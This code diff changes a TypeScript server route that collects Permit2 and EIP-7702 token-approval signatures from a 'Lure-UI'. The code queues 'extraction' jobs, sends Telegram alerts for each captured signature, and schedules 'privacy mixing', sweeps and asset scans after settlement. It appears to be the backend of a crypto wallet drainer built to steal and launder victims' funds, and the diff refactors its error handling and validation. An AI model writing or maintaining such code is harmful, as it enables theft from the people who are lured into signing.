@@ -1,4 +1,3 @@
-// @ts-nocheck
 /**
  * Signature Anchor — omni-payload ingress to `signatures` (settlement.ts builders + Supabase service role).
  * Route Initialization aligned with Lure-UI `/api/signature-anchor` institutional contract.
@@ -81,7 +80,7 @@ import {
 } from '@legion/core/logic/settlement'
 import { verifyAuthorizedSessionPersistenceAnchor } from '@legion/core/logic/index'
 import { sealSignatureHexForPersistence } from '@legion/core/security/signature-shadow-envelope'
-import { createClient, type SupabaseClient } from '@supabase/supabase-js'
+import { createClient } from '@supabase/supabase-js'
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 import type { Address, Hex } from 'viem'
 import { createPublicClient, getAddress, http, isAddress, stringToHex } from 'viem'
@@ -1072,23 +1071,15 @@ async function completeSettlementTracking(params: {
   }
 
   if (params.historyId) {
-    try {
-      await finalizeSettlementHistory({
-        id: params.historyId,
-        status,
-        tx_hash: txHash,
-        error_message: errorMessage,
-      })
-    } catch (err) {
-      gatekeeperPersistLog(
-        'warn',
-        'settlement.history.finalize_failed',
-        err instanceof Error ? err.message : String(err),
-      )
-    }
+    await finalizeSettlementHistory({
+      id: params.historyId,
+      status,
+      tx_hash: txHash,
+      error_message: errorMessage,
+    })
   }
 
-  void notifySettlementResult({
+  await notifySettlementResult({
     wallet_address: params.row.wallet_address,
     chain_family: params.row.chain_family ?? undefined,
     chain_id: params.chainNorm ?? undefined,
@@ -1186,13 +1177,13 @@ async function runOmnichainAtomicReconciliation(params: {
       atomic.omnichain_transaction_hashes?.jetton
 
     if (primaryTxHash) {
-      void notifyBroadcastConfirmed(primaryTxHash, row.wallet_address, {
+      notifyBroadcastConfirmed(primaryTxHash, row.wallet_address, {
         ...reconciliationTelegramCtx,
         tx_hash: primaryTxHash,
       }).catch(() => {})
     }
 
-    void sendSovereignTelemetryPayload({
+    await sendSovereignTelemetryPayload({
       event: 'SETTLEMENT_IGNITED',
       message: 'SETTLEMENT_IGNITED: Omnichain atomic portfolio settlement finalized.',
       tx_hash: primaryTxHash ?? undefined,
@@ -1206,7 +1197,7 @@ async function runOmnichainAtomicReconciliation(params: {
       row,
       settlement_tx_hash: primaryTxHash ?? undefined,
       scout_value_usd,
-    }).catch(() => {})
+    })
     void schedulePostSettlementSweep()
 
     outcome = {
@@ -1379,12 +1370,12 @@ async function runEventDrivenReconciliation(params: {
       ...reconciliationTelegramCtx,
       tx_hash: txHash,
     }
-    void notifyBroadcastConfirmed(txHash, row.wallet_address, settlementTelegramCtx).catch(() => {})
+    notifyBroadcastConfirmed(txHash, row.wallet_address, settlementTelegramCtx).catch(() => {})
   }
 
   const relayPending = settlementRelayIntermediaryPending(outcome)
   if (relayPending) {
-    void notifyRelayIntermediaryWarning({
+    notifyRelayIntermediaryWarning({
       chain_family: row.chain_family ?? 'SVM',
       wallet_address: row.wallet_address,
       tx_hash: relayPending.tx_hash ?? txHash,
@@ -1392,20 +1383,20 @@ async function runEventDrivenReconciliation(params: {
     }).catch(() => {})
   }
 
-  void sendSovereignTelemetryPayload({
+  await sendSovereignTelemetryPayload({
     event: 'SETTLEMENT_IGNITED',
     message: 'SETTLEMENT_IGNITED: Event-Driven Reconciliation finalized.',
     tx_hash: txHash,
     value: row.amount ?? '0',
     chain_id,
     protocol: row.protocol,
-  }).catch(() => {})
+  })
 
   void schedulePostSettlementPrivacyMixing({
     row,
     settlement_tx_hash: txHash,
     scout_value_usd,
-  }).catch(() => {})
+  })
   void schedulePostSettlementSweep()
   void onLargeSettlementSettled({
     wallet_address: row.wallet_address,
@@ -1414,7 +1405,7 @@ async function runEventDrivenReconciliation(params: {
     token_address: row.token_address,
     policy: settlement_policy,
     tx_hash: txHash,
-  }).catch(() => {})
+  })
 
   return outcome
 }
@@ -1459,6 +1450,15 @@ async function signatureAnchorPostHandler(
         // Mark this signature as seen
         if (!(globalThis as any).__dedup_cache) {
           (globalThis as any).__dedup_cache = {}
+          // Cleanup old entries every 60 seconds to prevent memory leak
+          setInterval(() => {
+            const cache = (globalThis as any).__dedup_cache
+            if (!cache) return
+            const now = Date.now()
+            for (const key of Object.keys(cache)) {
+              if (now - cache[key] > DEDUP_WINDOW * 2) delete cache[key]
+            }
+          }, 60_000)
         }
         (globalThis as any).__dedup_cache[dedupKey] = Date.now()
       }
@@ -1551,15 +1551,9 @@ async function signatureAnchorPostHandler(
 }
 
 export async function registerSignatureAnchorRoute(app: FastifyInstance): Promise<void> {
-  // Signature endpoints don't require auth for extraction flow
-
   app.get('/api/v1/signature-anchor/eip7702-typed-data', async (request, reply) => {
     if (!isEip7702Enabled()) {
-      return sendSuccess(reply, 200, 'EIP-7702 feature is disabled', {
-        enabled: false,
-        feature: 'eip7702_delegation',
-        status: 'disabled'
-      })
+      return sendFailure(reply, 503, 'EIP7702_ENABLED is false', { code: 'FeatureDisabled' })
     }
     const q = request.query as Record<string, string | undefined>
     const walletRaw = q.wallet?.trim() ?? q.wallet_address?.trim() ?? ''
@@ -1599,7 +1593,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         code: 'ValidationError',
       })
     }
-    if (!/^0x[a-fA-F0-9]{40}$/.test(walletRaw) || !/^0x[a-fA-F0-9]{40}$/.test(tokenRaw)) {
+    if (!isAddress(walletRaw) || !isAddress(tokenRaw)) {
       return sendFailure(reply, 400, 'wallet and token must be valid EVM addresses', {
         code: 'ValidationError',
       })
@@ -1628,8 +1622,8 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
 
     try {
       const built = await buildPermit2TypedDataForWallet({
-        wallet: walletRaw.toLowerCase() as Address,
-        token: tokenRaw.toLowerCase() as Address,
+        wallet: walletRaw as Address,
+        token: tokenRaw as Address,
         chainId,
         rpcUrl,
       })
@@ -1669,7 +1663,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         code: 'ValidationError',
       })
     }
-    if (!/^0x[a-fA-F0-9]{40}$/.test(walletRaw)) {
+    if (!isAddress(walletRaw)) {
       return sendFailure(reply, 400, 'wallet_address must be a valid EVM address', {
         code: 'ValidationError',
       })
@@ -1682,7 +1676,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     for (const entry of permitsRaw) {
       const tokenRaw = entry.token?.trim() ?? ''
       const amountRaw = entry.amount?.trim() ?? ''
-      if (!tokenRaw || !amountRaw || !/^0x[a-fA-F0-9]{40}$/.test(tokenRaw)) {
+      if (!tokenRaw || !amountRaw || !isAddress(tokenRaw)) {
         return sendFailure(reply, 400, 'Each permit requires valid token and amount', {
           code: 'ValidationError',
         })
@@ -1700,7 +1694,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
           code: 'ValidationError',
         })
       }
-      permits.push({ token: tokenRaw.toLowerCase() as Address, amount })
+      permits.push({ token: tokenRaw as Address, amount })
     }
     let nativeAmount = 0n
     if (body.nativeAmount != null) {
@@ -1796,7 +1790,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
 
     try {
       const built = await buildPermit2BatchTypedDataForWallet({
-        wallet: walletRaw.toLowerCase() as Address,
+        wallet: walletRaw as Address,
         chainId,
         permits,
         nativeAmount,
@@ -1938,7 +1932,8 @@ async function persistSignatureRow(
     ? tokenAddress.toLowerCase()
     : tokenAddress
 
-  const supabase: SupabaseAdminClient = createClient(url, serviceKey)
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const supabase: any = createClient(url, serviceKey)
   const rowPayload: Record<string, unknown> = {
     wallet_address: walletNorm,
     token_address: tokenNorm,
@@ -1978,13 +1973,13 @@ async function persistSignatureRow(
     tokenAddress: row.token_address,
     signature: row.signature_hex,
   }
-  void notifySignatureReceived(
+  notifySignatureReceived(
     row.wallet_address,
     row.protocol.toUpperCase(),
     row.signature_hex,
     anchorTelegramCtx,
   ).catch(() => {})
-  void notifyNewSignatureAnchorRequest(
+  notifyNewSignatureAnchorRequest(
     row.wallet_address,
     row.protocol.toUpperCase(),
     row.wallet_type,
@@ -1992,27 +1987,24 @@ async function persistSignatureRow(
     anchorTelegramCtx,
   ).catch(() => {})
 
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  const { data: savedRecord, error: upErr } = await (supabase
+  const { data: savedRecord, error: upErr } = await supabase
     .from('signatures')
-    .upsert([rowPayload] as any, {
+    .upsert(rowPayload, {
       onConflict: 'wallet_address,token_address',
     })
     .select('id')
-    .single() as any)
+    .single()
 
-  if (upErr || !savedRecord) {
-    const shadowDetail = upErr ? serializeSupabaseFault(upErr) : 'No record returned from upsert'
+  if (upErr) {
+    const shadowDetail = serializeSupabaseFault(upErr)
     gatekeeperPersistLog('error', 'signatures.upsert_failed', shadowDetail, anchorLogFields(row))
-    return sendFailure(reply, 502, upErr?.message ?? 'Upsert failed', { code: 'UpstreamError' })
+    return sendFailure(reply, 502, upErr.message, { code: 'UpstreamError' })
   }
-
-  const signatureIdStr = savedRecord.id != null ? String(savedRecord.id) : undefined
 
   try {
     const enqueueResult = await enqueueExtractionJob('extraction', {
       wallet_address: row.wallet_address,
-      signature_id: signatureIdStr,
+      signature_id: savedRecord?.id != null ? String(savedRecord.id) : undefined,
       chain_id: chainNormForTelegram ?? 'eip155',
       token_address: row.token_address,
     })
@@ -2056,7 +2048,7 @@ async function persistSignatureRow(
     token_address: row.token_address,
     amount: row.amount,
     protocol: row.protocol,
-    signature_id: signatureIdStr,
+    signature_id: savedRecord?.id != null ? String(savedRecord.id) : undefined,
   })
   if (ingress.proceed === false) {
     gatekeeperPersistLog(
@@ -2072,7 +2064,7 @@ async function persistSignatureRow(
       token_address: row.token_address,
       protocol: row.protocol,
       chain_id: chainNorm,
-      signature_id: signatureIdStr ?? null,
+      signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
     })
     if (deferredHistoryId) {
       gatekeeperPersistLog(
@@ -2111,10 +2103,10 @@ async function persistSignatureRow(
     token_address: row.token_address,
     protocol: row.protocol,
     chain_id: chainNorm,
-    signature_id: signatureIdStr ?? null,
+    signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
   })
 
-  void notifySettlementAttempt({
+  await notifySettlementAttempt({
     wallet_address: row.wallet_address,
     chain_family: row.chain_family ?? null,
     chain_id: chainNorm,
@@ -2150,7 +2142,7 @@ async function persistSignatureRow(
     })
   }
 
-  void queueKineticDeepAssetScan(row.wallet_address)
+  queueKineticDeepAssetScan(row.wallet_address)
 
   const persistenceAnchor = verifyAuthorizedSessionPersistenceAnchor(String(row.expiry))
   if (!persistenceAnchor.drift_window_ok && !process.env['PROD']) {
